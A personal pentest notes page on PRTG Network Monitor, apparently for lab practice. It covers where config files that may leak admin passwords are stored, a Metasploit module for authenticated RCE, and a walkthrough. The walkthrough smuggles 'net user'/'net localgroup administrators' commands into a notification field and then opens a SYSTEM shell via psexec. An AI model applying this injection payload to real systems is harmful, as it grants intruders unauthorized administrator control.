---
id: PRTG Network Monitor
aliases: []
tags:
  - Networking/Software/PRTG-Network-Monitor
links: "[[Networking]]"
---


<!-- General {{{-->
# General

**PRTG** (*[Paessler Router Traffic Grapher](https://en.wikipedia.org/wiki/Paessler_PRTG)*)
is a network monitoring software developed by Paessler GmbH

<!-- Configuration {{{-->
## Configuration

[Paessler Helpdesk - How and where does PRTG store its data?](https://helpdesk.paessler.com/en/support/solutions/articles/76000041654-how-and-where-does-prtg-store-its-data)

The configuration files are stored in `C:\ProgramData\Paessler`

```sh
cd C:\ProgramData\Paessler
```

Standard configuration files

<!-- Tip {{{-->
> [!tip]
>
> Standard configuration files may reveal the administrator password
>
> <!-- Example {{{-->
> > [!example]-
> >
> > ```sh
> > <dbpassword>
> >   <!-- User: prtgadmin -->
> >   PrTg@dmin2018
> > </dbpassword>
> > ```
<!-- }}} -->
>
<!-- }}} -->

```sh
PRTG Configuration.dat
```

```sh
PRTG Configuration.old
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Enumeration {{{-->
# Enumeration


___
<!-- }}} -->

<!-- Exploitation {{{-->
# Exploitation

<!-- CVE {{{-->
## CVE

[[Pentest/Tools/Metasploit/Metasploit]] - [PRTG Network Monitor Authenticated RCE](https://www.rapid7.com/db/modules/exploit/windows/http/prtg_authenticated_rce/)

```sh
use exploit/windows/http/prtg_authenticated_rce
```

<!-- Info {{{-->
> [!info]-
>
> It may require a few tries to get a shell
> because notifications are queued up on the server.
> This vulnerability affects versions prior to 18.2.39
>
> Notifications can be created by an authenticated user
> and can execute scripts when triggered.
>
> Due to a poorly validated input on the script name,
> it is possible to chain it with a user-supplied command
> allowing command execution under the context of privileged user.
>
> The module uses provided credentials to log in to the web interface,
> then creates and triggers a malicious notification to perform RCE
> using a Powershell payload.
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

Add a user and execute commands as `SYSTEM`

1. Open Notification

<!-- Example {{{-->
> [!example]-
>
> ![[prtg-notifications.png]]
>
<!-- }}} -->

2. Create new Notification

<!-- Example {{{-->
> [!example]-
>
> ![[prtg-notifications-new.png]]
>
<!-- }}} -->

3. Add a new user `htb` to the `Administrators` group

```sh
abc.txt | net user htb abc123! /add ; net localgroup administrators htb /add
```

<!-- Example {{{-->
> [!example]-
>
> ![[prtg-notifications-execute.png]]
>
<!-- }}} -->

4. Launch the Notification

<!-- Example {{{-->
> [!example]-
>
> ![[prtg-notifications-launch.png]]
>
<!-- }}} -->

5. Connect as `SYSTEM`

```sh
psexec.py htb:'abc123!'@$target
```

___
<!-- }}} -->
